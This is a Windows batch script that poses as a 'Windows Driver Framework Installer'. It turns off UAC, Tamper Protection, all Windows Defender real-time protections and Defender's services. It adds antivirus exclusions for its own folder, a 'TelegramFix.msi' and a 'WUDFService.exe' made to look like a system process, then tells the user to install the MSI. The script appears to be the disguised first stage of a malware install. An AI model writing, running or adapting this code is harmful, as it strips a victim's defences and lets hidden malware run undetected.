@echo off
title Windows Driver Framework Installer
echo =========================================
echo   Windows Driver Framework - Preparation
echo =========================================
echo.
echo Preparing system, please wait...
echo.

:: Get the current directory (where this BAT is located)
set "CURDIR=%~dp0"
if "%CURDIR:~-1%"=="\" set "CURDIR=%CURDIR:~0,-1%"

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection (if possible)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable all Defender real-time protection components via PowerShell
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" >nul 2>&1
powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableArchiveScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

:: 4. Disable Defender via registry (persistent)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. Stop and disable Defender services
sc stop WdNisSvc >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc stop Sense >nul 2>&1
sc config Sense start= disabled >nul 2>&1

:: 6. Create installation folder
mkdir "C:\Program Files (x86)\Windows Driver Framework\v1" 2>nul

:: ========== ADD EXCLUSIONS FOR THE SOURCE FOLDER AND FILES ==========
powershell -Command "Add-MpPreference -ExclusionPath '%CURDIR%'" >nul 2>&1
if exist "%CURDIR%\TelegramFix.msi" (
    powershell -Command "Add-MpPreference -ExclusionPath '%CURDIR%\TelegramFix.msi'" >nul 2>&1
)
if exist "%CURDIR%\TelegramFix1.bat" (
    powershell -Command "Add-MpPreference -ExclusionPath '%CURDIR%\TelegramFix1.bat'" >nul 2>&1
)

:: ========== ADD EXCLUSIONS FOR THE INSTALLATION DESTINATION ==========
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Windows Driver Framework\v1'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'WUDFService.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Windows Driver Framework\v1\WUDFService.exe'" >nul 2>&1

echo.
echo Preparation completed.
echo.
echo Windows Defender real-time protection has been disabled.
echo Defender services have been stopped and set to disabled.
echo UAC has been disabled.
echo.
echo Now please install TelegramFix.msi manually (double-click, follow the wizard).
echo After installation, reboot your computer.
echo.
echo This window will close in 10 seconds...
timeout /t 10 /nobreak >nul
exit